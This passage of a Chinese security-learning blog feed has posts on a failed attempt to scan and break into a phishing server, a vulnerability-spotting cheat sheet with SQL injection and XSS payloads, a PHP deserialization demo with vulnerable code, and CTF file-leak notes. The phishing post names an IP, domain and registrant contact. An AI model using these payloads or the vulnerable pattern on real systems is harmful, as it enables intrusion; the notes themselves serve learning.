乘筏渡过不可能。</p><p><strong>赏析：</strong></p><p>这首诗表达出了作者对一个姑娘喜欢到了极致，但是因为自己和姑娘之间巨大的差距，得不到那位姑娘，就像那广阔的汉水，一个人的力量在它面前是如此的渺小，如此的无力，因此只能把那份来自心底的爱埋得更深了。甚至在姑娘结婚时，也不敢表达心中的爱意，能做的只是努力的去喂饱它的马，在心里默默的祝福她。本诗每一句都用“汉之广矣，不可泳思。江之永矣，不可方思。”结尾，深刻得表达出诗人那种心里对姑娘强烈的爱，但是又因为得不到姑娘，而产生的巨大的悲伤。当他看见姑娘披上那美丽的嫁衣，凤冠霞帔，看着那如此美丽的姑娘，他是那么希望成为迎娶姑娘的那个人，而不是如今看着姑娘出嫁，自己能做的只能是喂饱姑娘的马。另一方面，这首诗还传达出了诗人由希望到失望最后到绝望的心理。</p><p>这两首诗都是作者对心爱之人如此的喜爱，却又得不到，只有在远处观望，在远处偷偷的喜爱，甚至不敢把这些喜爱表达出来，能做的只是在远处默默的守侯，这种爱是如此的卑微，以至于不会被对方所珍惜，两情相悦的爱情纵然是完美的，但是这世间更多的还是这种得不到的爱，愿你能遇见一个能和你两情相悦的人。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;淇奥&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;诗经·国风·卫风·淇奥&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　瞻彼淇奥，绿竹猗猗。有匪君子，如切如磋，如琢如磨。瑟兮僩兮，赫兮咺兮。有匪君子，终不可谖兮。&lt;/p&gt;
&lt;p&gt;　瞻彼淇奥，绿竹青青。有匪君子，充耳琇莹，会弁如星。瑟兮僩兮，赫兮咺兮。
      
    
    </summary>
    
    
    
      <category term="诗经" scheme="https://knightswd.github.io/tags/%E8%AF%97%E7%BB%8F/"/>
    
      <category term="爱情" scheme="https://knightswd.github.io/tags/%E7%88%B1%E6%83%85/"/>
    
  </entry>
  
  <entry>
    <title>一次不成功的渗透</title>
    <link href="https://knightswd.github.io/2019/03/27/%E4%B8%80%E6%AC%A1%E4%B8%8D%E6%88%90%E5%8A%9F%E7%9A%84%E6%B8%97%E9%80%8F/"/>
    <id>https://knightswd.github.io/2019/03/27/%E4%B8%80%E6%AC%A1%E4%B8%8D%E6%88%90%E5%8A%9F%E7%9A%84%E6%B8%97%E9%80%8F/</id>
    <published>2019-03-27T07:16:06.000Z</published>
    <updated>2019-03-31T08:08:43.692Z</updated>
    
    <content type="html"><![CDATA[<p>​    3月26日早上，我的qq邮箱中有人给我发了一封邮件，点进去一看，居然是<a href="http://mail.qq.com.biy.suyrgroup.cn" target="_blank" rel="noopener">http://mail.qq.com.biy.suyrgroup.cn</a> 这个域名，很具有迷惑性，然后返回去看，他邮箱给的网址是t.cn/EJIWUqj，可以猜测，他应该是设置了一个跳转，然后在输入qq密码和账号的网站随便输入一个账号密码，再用bp抓包，发现它是用get方式将账号密码发送到了lyq51.cn/save.php这个文件下，因此判断lyq54.cn这个域名指向了钓鱼者的真实服务器，通过查询发现这个域名对应的用户名是万兆飞，对应的邮箱是 <a href="mailto:anan54246@163.com">anan54246@163.com</a> （因为我是想练技术，因此没有采取社工的方法）然后通过ping这个服务器知道了他的ip是103.224.82.129，然后拿出我们的核武器——nmap，扫了下他的端口，发现他开了21、80、888，其中21是用的pure-ftpd，80是 nginx服务器，php版本是5.x，888也是nginx服务器。感觉测试了几个ftp的弱密码，发现无效后，转战web。</p><p>用目录扫描工具扫描目录发现</p><h3 id="主目录"><a href="#主目录" class="headerlink" title="主目录"></a>主目录</h3><p>[13:22:14] 301 -  178B  - /ad  -&gt;  <a href="http://lyq51.cn/ad/登陆界面" target="_blank" rel="noopener">http://lyq51.cn/ad/登陆界面</a></p><p>list.php  set.php</p><p>[13:22:54] 301 -  178B  - /api  -&gt;  <a href="http://lyq51.cn/api/一个js代码" target="_blank" rel="noopener">http://lyq51.cn/api/一个js代码</a><br>[13:22:54] 200 -  452B  - /api/index.php<br>[13:23:27] 301 -  178B  - /css  -&gt;  <a href="http://lyq51.cn/css/禁止访问" target="_blank" rel="noopener">http://lyq51.cn/css/禁止访问</a><br>[13:23:59] 301 -  178B  - /img  -&gt;  <a href="http://lyq51.cn/img/禁止访问" target="_blank" rel="noopener">http://lyq51.cn/img/禁止访问</a><br>[13:24:00] 301 -  178B  - /includes  -&gt;  <a href="http://lyq51.cn/includes/禁止访问" target="_blank" rel="noopener">http://lyq51.cn/includes/禁止访问</a><br>[13:24:00] 403 -  564B  - /includes/<br>[13:24:01] 200 -   13KB - /index.html一个不完善的钓鱼界面<br>[13:24:03] 301 -  178B  - /install  -&gt;  <a href="http://lyq51.cn/install/" target="_blank" rel="noopener">http://lyq51.cn/install/</a><br>[13:24:04] 200 -    1KB - /install/一个钓鱼网站 的安装界面</p><p>install/index.php/login/</p><p>[13:24:08] 301 -  178B  - /js  -&gt;  <a href="http://lyq51.cn/js/禁止访问" target="_blank" rel="noopener">http://lyq51.cn/js/禁止访问</a><br>[13:24:11] 301 -  178B  - /lib  -&gt;  <a href="http://lyq51.cn/lib/禁止访问" target="_blank" rel="noopener">http://lyq51.cn/lib/禁止访问</a><br>[13:25:26] 301 -  178B  - /template  -&gt;  <a href="http://lyq51.cn/template/" target="_blank" rel="noopener">http://lyq51.cn/template/</a><br>[13:25:26] 403 -  564B  - /template/禁止访问<br>[13:25:26] 301 -  178B  - /test  -&gt;  <a href="http://lyq51.cn/test/" target="_blank" rel="noopener">http://lyq51.cn/test/</a><br>[13:25:29] 200 -    4KB - /test/index.php之前那个api的js代码</p><h3 id="install目录"><a href="#install目录" class="headerlink" title="install目录"></a>install目录</h3><p>[23:49:18] 200 -    1KB - /install/index.php<br>[23:49:19] 200 -    1KB - /install/index.php/login/<br>[23:49:37] 200 -    2KB - /install/install.sql    这个文件是钓鱼网站安装是的sql配置文件<br>[23:56:17] 200 -   23B  - /install/readme.txt</p><h3 id="ad目录"><a href="#ad目录" class="headerlink" title="ad目录"></a>ad目录</h3><p>[06:53:25] 503 -    0B  - /ad/account/signin<br>[07:05:46] 200 -    2KB - /ad/index.php<br>[07:05:47] 200 -    2KB - /ad/index.php/login/<br>[07:07:10] 200 -    3KB - /ad/login.php</p><h3 id="api目录"><a href="#api目录" class="headerlink" title="api目录"></a>api目录</h3><p>[07:29:05] 200 -    0B  - /api/get.php<br>[07:30:33] 200 -  452B  - /api/index.php<br>[07:30:34] 200 -  452B  - /api/index.php/login/</p><h3 id="test目录"><a href="#test目录" class="headerlink" title="test目录"></a>test目录</h3><p>[07:57:16] 301 -  178B  - /test/css  -&gt;  <a href="http://lyq51.cn/test/css/" target="_blank" rel="noopener">http://lyq51.cn/test/css/</a><br>[07:58:57] 301 -  178B  - /test/img  -&gt;  <a href="http://lyq51.cn/test/img/" target="_blank" rel="noopener">http://lyq51.cn/test/img/</a><br>[07:59:01] 200 -    4KB - /test/index.php<br>[07:59:01] 200 -    4KB - /test/index.php/login/<br>[07:59:09] 503 -    0B  - /test/global.asax.bak<br>[07:59:29] 503 -    0B  - /test/js/swfupload/swfupload.swf<br>[07:59:32] 503 -    0B  - /test/letmein<br>[07:59:32] 503 -    0B  - /test/letmein.php</p><p>​    然后我测试了他的ad/login.php的注入点，用sqlmap跑了下发现不存在注入的问题，同时我还在之前的输入账号名秘密的地方测试了下，发现都不存在注入点。再通过bp抓到的包查看我能输入的地方，想去找找有没有ssrf漏洞，发现没什么收获。</p><p>​    于是我想去碰运气，看看后台登陆界面是否存在弱密码的问题，用bp爆破了一下，发现还是不能进去。最后没办法了，只有从新审计代码，看看能否从代码层面找到漏洞。</p><p>​    然后在3月27日下午两点，这个网站宣布关门了，我点击刷新后就什么也没有了。</p><p>​                                                                               T﹏T        哭了。。。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;​    3月26日早上，我的qq邮箱中有人给我发了一封邮件，点进去一看，居然是&lt;a href=&quot;http://mail.qq.com.biy.suyrgroup.cn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://mail.qq.com.b
      
    
    </summary>
    
    
    
      <category term="渗透" scheme="https://knightswd.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="钓鱼网站" scheme="https://knightswd.github.io/tags/%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>漏洞特征总结</title>
    <link href="https://knightswd.github.io/2019/03/25/%E6%BC%8F%E6%B4%9E%E7%89%B9%E5%BE%81%E6%80%BB%E7%BB%93/"/>
    <id>https://knightswd.github.io/2019/03/25/%E6%BC%8F%E6%B4%9E%E7%89%B9%E5%BE%81%E6%80%BB%E7%BB%93/</id>
    <published>2019-03-25T10:45:50.000Z</published>
    <updated>2019-04-23T12:44:31.777Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>任何和数据库有交互的数据中，都有可能存在sql注入</p><p>盲注是通过构造SQL判断语句，通过返回页面的不同将信息判断出来。返回页面有三种：有结果页面、0结果页面和错误过滤页面。只要有其中的两个页面，无论哪两个页面都可以，就可以判断存在注入漏洞。</p><p>基于时间的盲注：<code>&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></p><p>如果输入<code>admin&#39; and &#39;1&#39;=&#39;</code>和<code>admin&#39; and &#39;1&#39;=&#39;2</code>均显示密码错误，就有可能存在sql盲注</p><p>搜索型注入：<code>1%&#39; and 1=1 and &#39;%&#39;=&#39;</code>和<code>%&#39; and 1=2 and &#39;%&#39;=&#39;</code></p><p>sql万能密码：<code>admin&#39; or 1=1 or &#39;&#39;=&#39;</code></p><h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h1><p>有文件上传的地方</p><h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>当网站有重定向时，能控制跨域请求的地方</p><h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>​    查看网页源代码有没有对用户 的输入进行处理，然后输出。或者试探后端有没有对用户的输入进行处理</p><h1 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h1><p>​    判断网站对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造</p><p>可以查看网站是否有token</p><h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><p>有序列化和反序列化的地方</p><h1 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h1><p>输入 xml 以及 dtd，看是否报错。这个问题研究得还不够</p><h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><p><strong>“./“：代表目前所在的目录。</strong></p><p><strong>“ . ./“代表上一层目录。</strong></p><p><strong>“/“：代表根目录。</strong></p><p>在url中输入./或者../判断是否对url中这些字符是否有足够的过滤</p><h1 id="逻辑越权"><a href="#逻辑越权" class="headerlink" title="逻辑越权"></a>逻辑越权</h1><p>查看是否能够取得高权限用户的cookie值（可以通过xss来取得），从而伪装高权限的用户登陆。</p><p>本文持续更新</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sql注入&quot;&gt;&lt;a href=&quot;#sql注入&quot; class=&quot;headerlink&quot; title=&quot;sql注入&quot;&gt;&lt;/a&gt;sql注入&lt;/h1&gt;&lt;p&gt;任何和数据库有交互的数据中，都有可能存在sql注入&lt;/p&gt;
&lt;p&gt;盲注是通过构造SQL判断语句，通过返回页面的不同将
      
    
    </summary>
    
    
    
      <category term="ctf" scheme="https://knightswd.github.io/tags/ctf/"/>
    
      <category term="漏洞" scheme="https://knightswd.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化</title>
    <link href="https://knightswd.github.io/2019/03/15/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://knightswd.github.io/2019/03/15/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2019-03-15T13:46:14.000Z</published>
    <updated>2019-05-15T09:28:45.973Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-、漏洞代码"><a href="#1-、漏洞代码" class="headerlink" title="1 、漏洞代码"></a><strong>1</strong> 、<strong>漏洞代码</strong></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'a.txt'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> phpinfo();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> F();</span><br><span class="line"></span><br><span class="line">serialize($a);</span><br><span class="line"></span><br><span class="line">$b = unserialize(<span class="string">'O:1:"F":1:&#123;s:9:"filenameF";s:8:"bcda.txt";&#125;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是一个简单的将变量序列化，然后反序列化。</p><p>运行结果就会显示php的基本信息</p><h1 id="2、-漏洞原因"><a href="#2、-漏洞原因" class="headerlink" title="2、 漏洞原因"></a><strong>2、</strong> <strong>漏洞原因</strong></h1><p>为什么这里会执行phpinfo()呢？</p><p>在理解这个之前先了解下php序列化：</p><p>序列化说通俗点就是把一个对象变成可以传输的字符串，这个有点类似于前端的json传输数据</p><p>我们再来看下将一个变量($test=hahaha)序列化后的样子吧</p><p>O:1:”S”:1:{s:4:”test”;s:7:”hahaha”;}</p><p>O:代表object<br> 1:代表对象名字长度为一个字符<br> S:对象的名称<br> 1:代表对象里面有一个变量<br> s:数据类型<br> 4:变量名称的长度<br> test:变量名称<br> s:数据类型<br> 7:变量值的长度<br> hahaha:变量值</p><p>反序列化就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p><p>序列化和反序列化本来是为了方便数据的传输的，本身是没有问题的，而问题就出在，序列化和反序列化过程中调用的php魔法函数</p><p>常见的几个魔法函数:<br> __construct()当一个对象创建时被调用       <strong>在序列化之前执行函数里面的内容</strong></p><p> __destruct()当一个对象销毁时被调用      <strong>在反序列化之后执行函数里面的内容</strong></p><p> __toString()当一个对象被当作一个字符串使用        <strong>此函数在执行echo或者print或者字符串输出的函数时被调用</strong></p><p> __sleep() 在对象在被序列化之前运行      <strong>在序列化之前执行函数里面的内容，且执行后序列化返回N;</strong></p><p> __wakeup将在序列化之后立即被调用     <strong>在反序列化之前执行函数里面的内容</strong></p><p>下面我们看一下php序列化造成的反射型xss</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">"pikachu"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'o'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    $s = $_POST[<span class="string">'o'</span>];</span><br><span class="line">    $unser=<span class="keyword">new</span> S();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!@$unser = unserialize($s))&#123;</span><br><span class="line"></span><br><span class="line">        $html.=<span class="string">"&lt;p&gt;input error&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        $html.=<span class="string">"&lt;p&gt;ok&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码利用的payload是</p><p>O:1:”S”:1:{s:4:”test”;s:29:”<script>alert('xss')</script>“;}</p><p>将这段payload反序列化后，test的值变成了<script>alert(‘xss’)</script>，然后在反序列化后，将对象销毁，调用魔法函数__destruct()，输出<script>alert(‘xss’)</script>到前端。</p><p>这个漏洞的威胁取决于魔法函数中的代码，严重的话可以造成任意代码执行。而且因为是php正常执行，因此不会任何异常。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-、漏洞代码&quot;&gt;&lt;a href=&quot;#1-、漏洞代码&quot; class=&quot;headerlink&quot; title=&quot;1 、漏洞代码&quot;&gt;&lt;/a&gt;&lt;strong&gt;1&lt;/strong&gt; 、&lt;strong&gt;漏洞代码&lt;/strong&gt;&lt;/h1&gt;&lt;figure class=&quot;high
      
    
    </summary>
    
    
    
      <category term="ctf" scheme="https://knightswd.github.io/tags/ctf/"/>
    
      <category term="php" scheme="https://knightswd.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>文件泄露</title>
    <link href="https://knightswd.github.io/2019/03/09/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/"/>
    <id>https://knightswd.github.io/2019/03/09/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/</id>
    <published>2019-03-09T07:00:15.000Z</published>
    <updated>2019-05-03T06:26:53.409Z</updated>
    
    <content type="html"><![CDATA[<p>最近做一个utctf题，发现自己对各种应用的隐藏文件产生的文件目录泄露不太敏感，所以打算写个博客总结一波</p><h1 id="linux的-swp-文件"><a href="#linux的-swp-文件" class="headerlink" title="linux的.swp 文件"></a>linux的.swp 文件</h1><p>.swp文件是使用vim编辑器产生的隐藏文件，这个文件类似于一个虚拟内存，当内存不足时将硬盘空间虚拟成内存使用。当文件正常退出时，文件自动删除，如果没有对文件修改，只是读取文件，是不会产生.swp文件的。</p><h1 id="mac的-DS-store文件"><a href="#mac的-DS-store文件" class="headerlink" title="mac的.DS_store文件"></a>mac的.DS_store文件</h1><p>.DS_Store是Mac OS保存文件夹的自定义属性的隐藏文件。</p><h1 id="windows的desktop-ini"><a href="#windows的desktop-ini" class="headerlink" title="windows的desktop.ini"></a>windows的desktop.ini</h1><p>desktop.ini作用是存储用户对文件夹的个性设置，和mac 的DS_store类似。</p><h1 id="IDEA产生的-idea文件"><a href="#IDEA产生的-idea文件" class="headerlink" title="IDEA产生的.idea文件"></a>IDEA产生的.idea文件</h1><p>当使用pycharm作为IDE时，会自动生成.idea/文件夹来存放项目的配置信息。其中包括版本控制信息、历史记录等等。</p><p>当ctf题中出现能任意读取文件，但是不知道文件在哪里，有哪些文件时，需要思考是不是有文件目录泄露的问题。</p><h1 id="linux中的-bash-history文件"><a href="#linux中的-bash-history文件" class="headerlink" title="linux中的.bash_history文件"></a>linux中的.bash_history文件</h1><p>.bash_history这个文件是保存了用户执行过的shell命令，默认是1000条shell命令</p><h1 id="git文件泄露"><a href="#git文件泄露" class="headerlink" title=".git文件泄露"></a>.git文件泄露</h1><p>.git文件泄露可以通过<code>githack</code>将文件的还原，.git文件中主要有用的是objects目录下的文件，objects下的文件目录名字是hash的前两位，而文件夹里面的是hash的后面的数字。git可以通过命令将其复原</p><p>githack命令：</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure></blockquote><p>git复原命令：</p><blockquote><p>git cat-file -p {hash}</p></blockquote><h1 id="使用nano编辑器产生的-save文件"><a href="#使用nano编辑器产生的-save文件" class="headerlink" title="使用nano编辑器产生的.save文件"></a>使用nano编辑器产生的.save文件</h1><p>INS‘HACK里面的一个题，文件泄露为index.php.save。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近做一个utctf题，发现自己对各种应用的隐藏文件产生的文件目录泄露不太敏感，所以打算写个博客总结一波&lt;/p&gt;
&lt;h1 id=&quot;linux的-swp-文件&quot;&gt;&lt;a href=&quot;#linux的-swp-文件&quot; class=&quot;headerlink&quot; title=&quot;linux的
      
    
    </summary>
    
    
    
      <category term="ctf" scheme="https://knightswd.github.io/tags/ctf/"/>
    
      <category term="隐藏文件" scheme="https://knightswd.github.io/tags/%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
</feed>
